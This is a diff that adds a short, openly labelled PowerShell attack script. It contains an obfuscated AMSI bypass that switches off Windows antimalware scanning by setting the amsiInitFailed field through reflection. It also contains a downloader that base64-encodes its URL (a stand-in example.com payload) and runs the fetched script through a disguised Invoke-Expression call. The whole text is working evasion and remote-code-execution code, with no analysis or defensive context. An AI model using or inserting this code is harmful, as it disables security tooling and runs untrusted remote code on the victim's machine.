@@ -1,0 +1,8 @@
+# AMSI bypass obfuscated
+[Ref].Assembly.GetType([String]::Join('',([char]83,[char]121,[char]115,[char]116,[char]101,[char]109,'.',[char]77,[char]97,[char]110,[char]97,[char]103,[char]101,[char]109,[char]101,[char]110,[char]116,'.',[char]65,[char]117,[char]116,[char]111,[char]109,[char]97,[char]116,[char]105,[char]111,[char]110,'.',[char]65,[char]109,[char]115,[char]105,[char]85,[char]116,[char]105,[char]108,[char]115]))).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# Downloader with encoded URL
+$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cDovL2V4YW1wbGUuY29tL3BheWxvYWQucHMx"))
+$w=New-Object Net.WebClient
+$IEX= "Invoke-Expression"
+&($IEX) ($w.DownloadString($u))
